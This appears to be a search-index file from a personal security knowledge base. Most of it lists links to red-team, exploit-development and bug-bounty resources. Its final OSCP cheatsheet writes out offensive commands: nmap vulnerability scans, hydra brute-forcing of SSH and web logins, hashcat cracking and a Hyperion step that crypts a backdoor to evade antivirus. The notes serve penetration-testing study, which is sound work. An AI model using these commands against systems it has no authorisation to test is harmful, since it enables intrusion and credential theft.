{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Home This repository contains structurally organized, security related quick references, cheat-sheets, and resources maintained by ayomawdb . Please check different categories for more details. Home page is reserved mainly to list down pending analysis and pending research items, and also to point to other similar security related knowledge bases. Cheatsheets http://cheat.sh/ Day-to-day Tools CyberChef: https://gchq.github.io/CyberChef https://www.youtube.com/watch?v=LnhSTZgzKuY GoogleToolbox: https://toolbox.googleapps.com/apps/main/ Browserinfo, MX, Dig, HAR, Log Analyzer, Mail Headers, Encode/Decode Other Collections ComputerSecurityStudent - Metasploitable Project Exploits: https://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=f213c73c216e2231c8f0d65f3d93ac18 TYPE=SUB Exploit collection - https://github.com/jivoi/pentest Hacking Methodology: https://www.greycampus.com/opencampus/ethical-hacking/hacking-methodology https://twitter.com/Alra3ees/status/1075569238474141697 Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ Red Teaming/Adversary Simulation Toolkit: https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md Red Team Techniques: Gaining access on an external engagement through spear-phishing: https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/ Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ http://ired.team/ Pasties: https://github.com/threatexpress/pasties/blob/master/pasties.md Red Team Scripts: https://github.com/threatexpress/red-team-scripts 101 Bash Commands and Tips for Beginners to Experts: https://dev.to/awwsmm/101-bash-commands-and-tips-for-beginners-to-experts-30je The Book of Secret Knowledge: https://github.com/trimstray/the-book-of-secret-knowledge Offensive Security Bookmarks: https://jivoi.github.io/2015/07/03/offensive-security-bookmarks/ List of Awesome Red Teaming Resources: https://github.com/yeyintminthuhtut/Awesome-Red-Teaming http://ired.team/offensive-security-experiments/offensive-security-cheetsheets Playbook for system hardening maintained by the #! security research team.: https://github.com/hashbang/hardening Blogs https://blog.0patch.com POC Repos https://github.com/qazbnm456/awesome-cve-poc Important files A binary that is a valid JAR, PE, ZIP, HTML: https://github.com/indrora/corkami/blob/master/src/mix/corkamix.asm / https://github.com/indrora/corkami/tree/master/src/mix Zip and Hach Collisions: https://github.com/corkami/collisions Crfting files in pure ASM: https://twitter.com/angealbertini/status/1088866350095835136 Podcasts https://darknetdiaries.com/ Graphs https://www.graphistry.com/ Pending Analysis CVEs Cisco CVE-2019-1653 - Allows a remote attacker to get sensitive device configuration details without a password. CVE-2019-1652 - Allows a remote attacker to inject and run admin commands on the device without a password. EternalRomance (MS17-010) Stuxnet CVEs Pending Analysis Tweets https://twitter.com/trimstray- Pending Analysis Tools sh00t - A Testing Environment for Manual Security Testers: https://github.com/pavanw3b/sh00t http://rumkin.com/tools Discord Channels https://discordapp.com/invite/VPFWfdt https://discordapp.com/invite/2AG6TCm https://discordapp.com/invite/4gHhxS8 https://discordapp.com/invite/7Z2PmWP VMS Malware Analysis (windows): https://github.com/GoSecure/malboxes ATT CK ATT CKing the Singapore Health Data Breach: https://bitofhex.com/2019/01/13/attack-and-singapore-breach/ HELK Dashboard: https://github.com/Cyb3rWard0g/ATTACK-Python-Client/tree/master/integrations/helk_cti Buy Giant Board: https://groboards.com/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ https://www.aliexpress.com/item/SX1278-ESP32-LoRa-0-96-Inch-Blue-OLED-Display-Bluetooth-WIFI-Lora-Kit-32-Module-IOT/32825749403.html https://www.aliexpress.com/item/13-56mHz-PN532-compatible-raspberry-pie-NFC-card-reader-module/2055119495.html?spm=2114.search0104.3.29.166f4b4fElzuKj ws_ab_test=searchweb0_0,searchweb201602_5_10065_10068_10130_10890_10547_319_10546_317_10548_10545_10696_453_10084_454_10083_10618_431_10307_537_536_10059_10884_10887_100031_321_322_10103-10890,searchweb201603_53,ppcSwitch_0 algo_expid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3-4 algo_pvid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3 transAbTest=ae803_5 Bundle Raspberry Pi 7\" Touchscreen Display Case : https://www.amazon.it/gp/product/B01M0AT5O5 Pending DIY Projects RPi Handheld: https://twitter.com/CrankyLinuxUser/status/1095111251510915075 Privacy: https://www.privacynow.net/privacy-devices Network Gears: https://twitter.com/fouroctets/status/1092121490579906560 Tools for capturing and analysing keyboard input paired with microphone capture: https://github.com/ggerganov/kbd-audio Web NES-style CSS Framework: https://nostalgic-css.github.io/NES.css/ itty.bitty.site: https://itty.bitty.site/#How_it_Works/XQAAAAK4CgAAAAAAAAAeHMqHyTY4PyKmqfkwr6ooCXSIMxPQ7ojYR153HqZD3W+keVdvwyoyd+luwncAksxo8PWJs+831jtAVty8rDpGXmyebtxMTP3PSa4g8/593sWue8MDcpOgi1bQyEtfa0JNQZ6T1I/xyNULg1rpwWgE2Y9BnqDq8fDN1N+nd58bizHxZrkeBhdg8inSQ/xKDX7JxpEnuwOAh4FOfn3+EHSxzhJsdQjZfh3lk4tTCDexgFND30Ea3NmmJGK84pdMtEVlcmKC5lrnUNmgoJa3QFsHJkr5595tk03idElTDVhmcQI3jSvPrkTVFTnSLeARVZXV/EUiF0y7+cR3bVkLoTkamZWDMiCTY2Xhv0LdNqWlb/xxyk6takRLrNnS8DkifXEbevTbJOUamuK7uy55kL61btF+/lYNHLWGbh1ckCYglReWWMlM0k4uuqM24okcS74tHtOW3Y5HZYBmPvRR+ItSrZPvbj3kbztOrWapUp7nAzgfIjYoBV/4xOXpFbbaHRft5GICE5Mr1PQhmW/nB63nTpnR+7UdHag8WIMa7nf+NvTPKC5MmQnKzhaMuqEnwGgcM5vkWbekimBclkGJwTGeyhxL7N6hivY+KS3H7vcOSFHXGr7K3PBIQZbywqQiimQ6B6zu4RvH7ZZ3ZN++ii00HKM0FPMcNHuOnL99vAxEl6TEFnx4J4+fwzJwNbuut30TFMBgcrE4iKAGncFIHmvOstFWxE+VlvTLC+uy6XArTO8BdfmbByGiyFv8Al7HqLAzGShdGWNzJ6cPpRwMAmWl5GNRA4qwjQAlfF1dtTwfIXSWOL7AyRwxPs27uY2cvVHCdmVVTNDYiTzHeKX6D9e2ApDRFD6pgcA9VMVP6UeOdVdmwRJ+iLTwQuCdLbVWzQ5T2i/chlihD+RawylXJQ8bKvxW9egXGcrgR5dyKaZCr8nBrArAgtRLR7PdqBQQbr5VodBvPc2FP3fZ6UuQVI1Kg4KcY44GIU5vnlM029TU+ibO2iSX3FhusTFhyOxl4TjjkuXBqA1V7Ha/Op2m8QZaP68p7AAZPOcTHAwP5PxENqIf8qS2aaG2Fiwp5rNED3LhPMjtN54klBYylr5hSAr0TD8J+XwFds8Gq9LToLE8Cq7XNJnE9RqNudIozaMWkfc6PRFjp/aH87x97nPDelKKHGyUEnGJyobw45BOhJMKzZST0VA5v+uQQo0djDXc0UXwzNRIWeBLuUJQpaXZY2gZMuLiSERgyDHg2MBI6trWsyb3ZWbFS4rm8Gq2dxfih3Kj6MdNapUo/jltQ31nx2LepJCQe9DNNF6JEMecls6dHTAM2RfHxEODSSKkF17FfjRLRAfxCK927UvizAxxggP5S/HrX6mGc5xonBy3StLd16thiAG860IdvFyBKfE6+CIhe2jzIwIofNiBILYlKA61vKkjlfZjqsUGDLi426U/Y8bdpxfg7FX1gqNEHeVM17dlBTO7pNOnKyeM2xmLoE7lr92/VIrxJ2OqNfcHu9XjrD6l71vU083VwwAq8Vencm9xLAlDyy3/6BB0kRBiJbjayYrLUbQyMGTFfEvOPmc/zJjfdnqHmg5O/0kuzf2+w5CHD426iPngjmiTo5Snlf+qW8emK/ltnQQIv2ufykH+Px3XZM+zsOclAyHI5MbCKBKeT6j5geCiz3uqci1w5ZlpRjtJWUT6zCj8Fx1eg4F4ov51gaODKV+QQWeFJSyuVTm3Nu2i7AbhKikNzb3RBeQinEh9KrhHc+o4JGezOU55h1UZtonB0+J5dfBRqHnc+6HaXfTmcLrMZjWErq15cBmC0Kx6BNyqP3uGhMUSF+OuIzffEX9fGUNDpUtCjKdbml8uF43e4fN8o10TxYkbggTcyYKI+xWHMyKM2tjOideyDwt33minfEy/JgSLsihBnBua9sfXCg32/+i2okk= Tools Invisible Watermarks with Space Characters in ASCII Files: https://github.com/Neo23x0/space-id universal command-line interface for SQL databases: https://github.com/xo/usql Video editing: https://twitter.com/digininja/status/1007936435129847808 Multitail - Look at multiple log files in the same time Pending Reads Analysis of following malware: * Badrabbit * NotPetya * Lazarus * https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf VPN Services: * NordVPN * MonoVM https://www.rebootuser.com/ Local Security Experts https://www.linkedin.com/in/kushantha https://www.linkedin.com/in/chanakaseekkuge/","title":"Home"},{"location":"#home","text":"This repository contains structurally organized, security related quick references, cheat-sheets, and resources maintained by ayomawdb . Please check different categories for more details. Home page is reserved mainly to list down pending analysis and pending research items, and also to point to other similar security related knowledge bases.","title":"Home"},{"location":"#cheatsheets","text":"http://cheat.sh/","title":"Cheatsheets"},{"location":"#day-to-day-tools","text":"CyberChef: https://gchq.github.io/CyberChef https://www.youtube.com/watch?v=LnhSTZgzKuY GoogleToolbox: https://toolbox.googleapps.com/apps/main/ Browserinfo, MX, Dig, HAR, Log Analyzer, Mail Headers, Encode/Decode","title":"Day-to-day Tools"},{"location":"#other-collections","text":"ComputerSecurityStudent - Metasploitable Project Exploits: https://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=f213c73c216e2231c8f0d65f3d93ac18 TYPE=SUB Exploit collection - https://github.com/jivoi/pentest Hacking Methodology: https://www.greycampus.com/opencampus/ethical-hacking/hacking-methodology https://twitter.com/Alra3ees/status/1075569238474141697 Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ Red Teaming/Adversary Simulation Toolkit: https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md Red Team Techniques: Gaining access on an external engagement through spear-phishing: https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/ Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ http://ired.team/ Pasties: https://github.com/threatexpress/pasties/blob/master/pasties.md Red Team Scripts: https://github.com/threatexpress/red-team-scripts 101 Bash Commands and Tips for Beginners to Experts: https://dev.to/awwsmm/101-bash-commands-and-tips-for-beginners-to-experts-30je The Book of Secret Knowledge: https://github.com/trimstray/the-book-of-secret-knowledge Offensive Security Bookmarks: https://jivoi.github.io/2015/07/03/offensive-security-bookmarks/ List of Awesome Red Teaming Resources: https://github.com/yeyintminthuhtut/Awesome-Red-Teaming http://ired.team/offensive-security-experiments/offensive-security-cheetsheets Playbook for system hardening maintained by the #! security research team.: https://github.com/hashbang/hardening","title":"Other Collections"},{"location":"#blogs","text":"https://blog.0patch.com","title":"Blogs"},{"location":"#poc-repos","text":"https://github.com/qazbnm456/awesome-cve-poc","title":"POC Repos"},{"location":"#important-files","text":"A binary that is a valid JAR, PE, ZIP, HTML: https://github.com/indrora/corkami/blob/master/src/mix/corkamix.asm / https://github.com/indrora/corkami/tree/master/src/mix Zip and Hach Collisions: https://github.com/corkami/collisions Crfting files in pure ASM: https://twitter.com/angealbertini/status/1088866350095835136","title":"Important files"},{"location":"#podcasts","text":"https://darknetdiaries.com/","title":"Podcasts"},{"location":"#graphs","text":"https://www.graphistry.com/","title":"Graphs"},{"location":"#pending-analysis-cves","text":"Cisco CVE-2019-1653 - Allows a remote attacker to get sensitive device configuration details without a password. CVE-2019-1652 - Allows a remote attacker to inject and run admin commands on the device without a password. EternalRomance (MS17-010) Stuxnet CVEs","title":"Pending Analysis CVEs"},{"location":"#pending-analysis-tweets","text":"https://twitter.com/trimstray-","title":"Pending Analysis Tweets"},{"location":"#pending-analysis-tools","text":"sh00t - A Testing Environment for Manual Security Testers: https://github.com/pavanw3b/sh00t http://rumkin.com/tools","title":"Pending Analysis Tools"},{"location":"#discord-channels","text":"https://discordapp.com/invite/VPFWfdt https://discordapp.com/invite/2AG6TCm https://discordapp.com/invite/4gHhxS8 https://discordapp.com/invite/7Z2PmWP","title":"Discord Channels"},{"location":"#vms","text":"Malware Analysis (windows): https://github.com/GoSecure/malboxes","title":"VMS"},{"location":"#attck","text":"ATT CKing the Singapore Health Data Breach: https://bitofhex.com/2019/01/13/attack-and-singapore-breach/ HELK Dashboard: https://github.com/Cyb3rWard0g/ATTACK-Python-Client/tree/master/integrations/helk_cti","title":"ATT&amp;CK"},{"location":"#buy","text":"Giant Board: https://groboards.com/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ https://www.aliexpress.com/item/SX1278-ESP32-LoRa-0-96-Inch-Blue-OLED-Display-Bluetooth-WIFI-Lora-Kit-32-Module-IOT/32825749403.html https://www.aliexpress.com/item/13-56mHz-PN532-compatible-raspberry-pie-NFC-card-reader-module/2055119495.html?spm=2114.search0104.3.29.166f4b4fElzuKj ws_ab_test=searchweb0_0,searchweb201602_5_10065_10068_10130_10890_10547_319_10546_317_10548_10545_10696_453_10084_454_10083_10618_431_10307_537_536_10059_10884_10887_100031_321_322_10103-10890,searchweb201603_53,ppcSwitch_0 algo_expid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3-4 algo_pvid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3 transAbTest=ae803_5 Bundle Raspberry Pi 7\" Touchscreen Display Case : https://www.amazon.it/gp/product/B01M0AT5O5","title":"Buy"},{"location":"#pending-diy-projects","text":"RPi Handheld: https://twitter.com/CrankyLinuxUser/status/1095111251510915075 Privacy: https://www.privacynow.net/privacy-devices Network Gears: https://twitter.com/fouroctets/status/1092121490579906560 Tools for capturing and analysing keyboard input paired with microphone capture: https://github.com/ggerganov/kbd-audio","title":"Pending DIY Projects"},{"location":"#web","text":"NES-style CSS Framework: https://nostalgic-css.github.io/NES.css/ itty.bitty.site: https://itty.bitty.site/#How_it_Works/XQAAAAK4CgAAAAAAAAAeHMqHyTY4PyKmqfkwr6ooCXSIMxPQ7ojYR153HqZD3W+keVdvwyoyd+luwncAksxo8PWJs+831jtAVty8rDpGXmyebtxMTP3PSa4g8/593sWue8MDcpOgi1bQyEtfa0JNQZ6T1I/xyNULg1rpwWgE2Y9BnqDq8fDN1N+nd58bizHxZrkeBhdg8inSQ/xKDX7JxpEnuwOAh4FOfn3+EHSxzhJsdQjZfh3lk4tTCDexgFND30Ea3NmmJGK84pdMtEVlcmKC5lrnUNmgoJa3QFsHJkr5595tk03idElTDVhmcQI3jSvPrkTVFTnSLeARVZXV/EUiF0y7+cR3bVkLoTkamZWDMiCTY2Xhv0LdNqWlb/xxyk6takRLrNnS8DkifXEbevTbJOUamuK7uy55kL61btF+/lYNHLWGbh1ckCYglReWWMlM0k4uuqM24okcS74tHtOW3Y5HZYBmPvRR+ItSrZPvbj3kbztOrWapUp7nAzgfIjYoBV/4xOXpFbbaHRft5GICE5Mr1PQhmW/nB63nTpnR+7UdHag8WIMa7nf+NvTPKC5MmQnKzhaMuqEnwGgcM5vkWbekimBclkGJwTGeyhxL7N6hivY+KS3H7vcOSFHXGr7K3PBIQZbywqQiimQ6B6zu4RvH7ZZ3ZN++ii00HKM0FPMcNHuOnL99vAxEl6TEFnx4J4+fwzJwNbuut30TFMBgcrE4iKAGncFIHmvOstFWxE+VlvTLC+uy6XArTO8BdfmbByGiyFv8Al7HqLAzGShdGWNzJ6cPpRwMAmWl5GNRA4qwjQAlfF1dtTwfIXSWOL7AyRwxPs27uY2cvVHCdmVVTNDYiTzHeKX6D9e2ApDRFD6pgcA9VMVP6UeOdVdmwRJ+iLTwQuCdLbVWzQ5T2i/chlihD+RawylXJQ8bKvxW9egXGcrgR5dyKaZCr8nBrArAgtRLR7PdqBQQbr5VodBvPc2FP3fZ6UuQVI1Kg4KcY44GIU5vnlM029TU+ibO2iSX3FhusTFhyOxl4TjjkuXBqA1V7Ha/Op2m8QZaP68p7AAZPOcTHAwP5PxENqIf8qS2aaG2Fiwp5rNED3LhPMjtN54klBYylr5hSAr0TD8J+XwFds8Gq9LToLE8Cq7XNJnE9RqNudIozaMWkfc6PRFjp/aH87x97nPDelKKHGyUEnGJyobw45BOhJMKzZST0VA5v+uQQo0djDXc0UXwzNRIWeBLuUJQpaXZY2gZMuLiSERgyDHg2MBI6trWsyb3ZWbFS4rm8Gq2dxfih3Kj6MdNapUo/jltQ31nx2LepJCQe9DNNF6JEMecls6dHTAM2RfHxEODSSKkF17FfjRLRAfxCK927UvizAxxggP5S/HrX6mGc5xonBy3StLd16thiAG860IdvFyBKfE6+CIhe2jzIwIofNiBILYlKA61vKkjlfZjqsUGDLi426U/Y8bdpxfg7FX1gqNEHeVM17dlBTO7pNOnKyeM2xmLoE7lr92/VIrxJ2OqNfcHu9XjrD6l71vU083VwwAq8Vencm9xLAlDyy3/6BB0kRBiJbjayYrLUbQyMGTFfEvOPmc/zJjfdnqHmg5O/0kuzf2+w5CHD426iPngjmiTo5Snlf+qW8emK/ltnQQIv2ufykH+Px3XZM+zsOclAyHI5MbCKBKeT6j5geCiz3uqci1w5ZlpRjtJWUT6zCj8Fx1eg4F4ov51gaODKV+QQWeFJSyuVTm3Nu2i7AbhKikNzb3RBeQinEh9KrhHc+o4JGezOU55h1UZtonB0+J5dfBRqHnc+6HaXfTmcLrMZjWErq15cBmC0Kx6BNyqP3uGhMUSF+OuIzffEX9fGUNDpUtCjKdbml8uF43e4fN8o10TxYkbggTcyYKI+xWHMyKM2tjOideyDwt33minfEy/JgSLsihBnBua9sfXCg32/+i2okk=","title":"Web"},{"location":"#tools","text":"Invisible Watermarks with Space Characters in ASCII Files: https://github.com/Neo23x0/space-id universal command-line interface for SQL databases: https://github.com/xo/usql Video editing: https://twitter.com/digininja/status/1007936435129847808 Multitail - Look at multiple log files in the same time","title":"Tools"},{"location":"#pending-reads","text":"Analysis of following malware: * Badrabbit * NotPetya * Lazarus * https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf VPN Services: * NordVPN * MonoVM https://www.rebootuser.com/","title":"Pending Reads"},{"location":"#local-security-experts","text":"https://www.linkedin.com/in/kushantha","title":"Local Security Experts"},{"location":"#httpswwwlinkedincominchanakaseekkuge","text":"","title":"https://www.linkedin.com/in/chanakaseekkuge/"},{"location":"bug-hunting/bounties/","text":"Bounty Programs ZERODIUM is the leading exploit acquisition platform for premium zero-days and advanced cybersecurity capabilities FedBounty - A Federally Sponsored National Bug Bounty Program","title":"Bounties"},{"location":"bug-hunting/bounties/#bounty-programs","text":"ZERODIUM is the leading exploit acquisition platform for premium zero-days and advanced cybersecurity capabilities FedBounty - A Federally Sponsored National Bug Bounty Program","title":"Bounty Programs"},{"location":"bug-hunting/guides/","text":"Bounty Guides Subdomain takeover Hitchhiker\u2019s Guide to Bug Bounty Hunting Throughout the Galaxy. v2 by Nick Jenkins Guide to Responsible Disclosure and Bug Bounty Educational Content Connections Google Bughunter University BugCroud University Getting started in bugbounties Writeup Collections https://pentester.land/list-of-bug-bounty-writeups.html Writeups Facebook Disclosing page members Google writeups $7.5k Google Cloud Platform organization issue","title":"Guides"},{"location":"bug-hunting/guides/#bounty-guides","text":"Subdomain takeover Hitchhiker\u2019s Guide to Bug Bounty Hunting Throughout the Galaxy. v2 by Nick Jenkins Guide to Responsible Disclosure and Bug Bounty","title":"Bounty Guides"},{"location":"bug-hunting/guides/#educational-content-connections","text":"Google Bughunter University BugCroud University Getting started in bugbounties","title":"Educational Content Connections"},{"location":"bug-hunting/guides/#writeup-collections","text":"https://pentester.land/list-of-bug-bounty-writeups.html","title":"Writeup Collections"},{"location":"bug-hunting/guides/#writeups","text":"","title":"Writeups"},{"location":"bug-hunting/guides/#facebook","text":"Disclosing page members","title":"Facebook"},{"location":"bug-hunting/guides/#google-writeups","text":"$7.5k Google Cloud Platform organization issue","title":"Google writeups"},{"location":"career/career-advice/","text":"References We Need to Kill the \u2018Security Analyst\u2019: https://medium.com/@LargeCardinal/we-need-to-kill-the-security-analyst-79ec205651f5 Preparing for a Tech Talk, Part 1: Motivation: https://overreacted.io/preparing-for-tech-talk-part-1-motivation/ Preparing for a Tech Talk, Part 2: What, Why, and How: https://overreacted.io/preparing-for-tech-talk-part-2-what-why-and-how/ My first experience as speaker at Voxxed Days 2018: a talk about React, React Native and Typescript: https://www.fabrizioduroni.it/2018/11/01/react-native-typescript-conference-voxxed-2018.html 10 Personal Finance Lessons for Technology Professionals: https://www.troyhunt.com/10-personal-finance-lessons-for-technology-professionals/ Quotes The real pros ask the real questions: 1)If 2)When 3)Why 4)What 5)How much have you got 6)Have you got it 7)Do you get it 8)If so, how often 9)Which do you choose, a hard or soft option 10)How much do you need?","title":"References"},{"location":"career/career-advice/#references","text":"We Need to Kill the \u2018Security Analyst\u2019: https://medium.com/@LargeCardinal/we-need-to-kill-the-security-analyst-79ec205651f5 Preparing for a Tech Talk, Part 1: Motivation: https://overreacted.io/preparing-for-tech-talk-part-1-motivation/ Preparing for a Tech Talk, Part 2: What, Why, and How: https://overreacted.io/preparing-for-tech-talk-part-2-what-why-and-how/ My first experience as speaker at Voxxed Days 2018: a talk about React, React Native and Typescript: https://www.fabrizioduroni.it/2018/11/01/react-native-typescript-conference-voxxed-2018.html 10 Personal Finance Lessons for Technology Professionals: https://www.troyhunt.com/10-personal-finance-lessons-for-technology-professionals/","title":"References"},{"location":"career/career-advice/#quotes","text":"The real pros ask the real questions: 1)If 2)When 3)Why 4)What 5)How much have you got 6)Have you got it 7)Do you get it 8)If so, how often 9)Which do you choose, a hard or soft option 10)How much do you need?","title":"Quotes"},{"location":"certifications/osce/preparation/","text":"New References https://tulpa-security.com/2017/07/18/288/ https://m101.github.io/binholic/2018/04/28/yet-another-osce-review.html https://github.com/FabioBaroni/awesome-exploit-development Summarized References https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/ Tools Olly Debugger WinDBG Immunity Debugger with Mona CFF Explorer LordPE DevCPP nasm VulnServer Training Open Security Training Introductory Intel x86: Architecture, Assembly, Applications, Alliteration Introduction To Software Exploits Exploits 2: Exploitation in the Windows Environment Exploit development Corelan Exploit Writing Tutorial Series Exploit Writing Tutorial Part 1 \u2013 Stack Based Overflows Buffer Overflows in the Microsoft Windows\u00ae Environment Basic Reverse Engineering with Immunity Debugger Egg hunting \"Safely Searching Process Virtual Address Space\" By Skape Egg Hunters \u2013 Fuzzy Security Egg Hunters \u2013 A Twist In Buffer Overflows Fuzzing 15 Minute Guide To Fuzzing SkyDogCon 2015: Fuzzing Basics \u2013 Scott M An Introduction to Fuzzing: Using fuzzers (SPIKE) to find vulnerabilities Practice Vulnserver \u2013 Fuzzing with Spike Bypassing exploit mitigation: Bypassing ASLR/DEP Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR Exploit Dev 101: Bypassing ASLR on Windows Bypassing ASLR and DEP on Windows 7: The Audio Converter Case Shellcoding: Exploit Writing Tutorial Part 9 \u2013 Introduction To Win32 Shellcoding ShellCode By Hand http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/ Web app security Web Application Pentesting \u2013 Webpwnized File Inclusion Vulnerabilities Guide Book on Cross Site Scripting Finding vulnerabilities in Web Applications AV evasion: https://resources.infosecinstitute.com/bypassing-antivirus/ https://www.youtube.com/watch?v=tBY46vs0ptE https://dl.packetstormsecurity.net/papers/bypass/bypassing-av.pdf https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Practice VulnServer Walk-throughs TRUN GMON HTER KSTET CTF CTP Registration: http://fc4.me/","title":"Preparation"},{"location":"certifications/osce/preparation/#new-references","text":"https://tulpa-security.com/2017/07/18/288/ https://m101.github.io/binholic/2018/04/28/yet-another-osce-review.html https://github.com/FabioBaroni/awesome-exploit-development","title":"New References"},{"location":"certifications/osce/preparation/#summarized-references","text":"https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/","title":"Summarized References"},{"location":"certifications/osce/preparation/#tools","text":"Olly Debugger WinDBG Immunity Debugger with Mona CFF Explorer LordPE DevCPP nasm VulnServer","title":"Tools"},{"location":"certifications/osce/preparation/#training","text":"","title":"Training"},{"location":"certifications/osce/preparation/#open-security-training","text":"Introductory Intel x86: Architecture, Assembly, Applications, Alliteration Introduction To Software Exploits Exploits 2: Exploitation in the Windows Environment","title":"Open Security Training"},{"location":"certifications/osce/preparation/#exploit-development","text":"Corelan Exploit Writing Tutorial Series Exploit Writing Tutorial Part 1 \u2013 Stack Based Overflows Buffer Overflows in the Microsoft Windows\u00ae Environment Basic Reverse Engineering with Immunity Debugger","title":"Exploit development"},{"location":"certifications/osce/preparation/#egg-hunting","text":"\"Safely Searching Process Virtual Address Space\" By Skape Egg Hunters \u2013 Fuzzy Security Egg Hunters \u2013 A Twist In Buffer Overflows","title":"Egg hunting"},{"location":"certifications/osce/preparation/#fuzzing","text":"15 Minute Guide To Fuzzing SkyDogCon 2015: Fuzzing Basics \u2013 Scott M An Introduction to Fuzzing: Using fuzzers (SPIKE) to find vulnerabilities","title":"Fuzzing"},{"location":"certifications/osce/preparation/#practice","text":"Vulnserver \u2013 Fuzzing with Spike","title":"Practice"},{"location":"certifications/osce/preparation/#bypassing-exploit-mitigation","text":"Bypassing ASLR/DEP Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR Exploit Dev 101: Bypassing ASLR on Windows Bypassing ASLR and DEP on Windows 7: The Audio Converter Case","title":"Bypassing exploit mitigation:"},{"location":"certifications/osce/preparation/#shellcoding","text":"Exploit Writing Tutorial Part 9 \u2013 Introduction To Win32 Shellcoding ShellCode By Hand http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/","title":"Shellcoding:"},{"location":"certifications/osce/preparation/#web-app-security","text":"Web Application Pentesting \u2013 Webpwnized File Inclusion Vulnerabilities Guide Book on Cross Site Scripting Finding vulnerabilities in Web Applications","title":"Web  app security"},{"location":"certifications/osce/preparation/#av-evasion","text":"https://resources.infosecinstitute.com/bypassing-antivirus/ https://www.youtube.com/watch?v=tBY46vs0ptE https://dl.packetstormsecurity.net/papers/bypass/bypassing-av.pdf https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/","title":"AV evasion:"},{"location":"certifications/osce/preparation/#practice_1","text":"","title":"Practice"},{"location":"certifications/osce/preparation/#vulnserver-walk-throughs","text":"TRUN GMON HTER KSTET","title":"VulnServer Walk-throughs"},{"location":"certifications/osce/preparation/#ctf","text":"CTP Registration: http://fc4.me/","title":"CTF"},{"location":"certifications/oscp/0-cheatsheet/","text":"Enumeration TCP nmap -sS -sV -sC -n [IP] nmap -vv -Pn -A -sC -sS -T 4 -p- 10.0.0.1 UDP nmap -sU -sV -n --top-ports 200 [IP] SNMP (UDP 161) snmp-check -t [IP] -c public SMTP nmap \u2013script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1 SNMP snmpwalk -c public -v1 10.0.0.0 SMB (TCP 139/TCP 445) enum4linux [IP] WebDav davtest -url http(s)://[IP] FTP: ftp [IP] Username: anonymous Password: anonymous nmap \u2013script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1 SMB (anonymous) smbclient -L \\\\[IP] Username: root Password: None enum4linux 10.0.0.1 nmap \u2013script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.0.0.1 MySQL nmap -sV -Pn -vv \u2013script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.0.1 -p 3306 Web Applications Structure Discovery dirb http://10.0.0.1 /usr/share/wordlists/dirb/common.txt Vulnerability Discovery nikto -h http(s)://[IP]:[PORT]/[DIRECTORY] Password Attacks https://hashkiller.co.uk john hashes.txt hashcat -m 500 -a 0 -o output.txt \u2013remove hashes.txt /usr/share/wordlists/rockyou.txt hydra 10.0.0.1 http-post-form \u201c/admin.php:target=auth mode=login user=^USER^ password=^PASS^:invalid\u201d -P /usr/share/wordlists/rockyou.txt -l admin hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt ssh://10.0.0.1 Tunneling Tunnels traffic through 10.0.0.1 and makes a route for all traffic destined for 10.10.10.0/24 through your sshuttle tunnel. sshuttle -r root@10.0.0.1 10.10.10.0/24 sshuttle -l (any port) -r root@10.10.0.1 10.10.0.0/24 AV Bypassing root@kali:~/Hyperion-1.0# wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe https://github.com/furrukhtaj/Enumerator Scripts from awansec 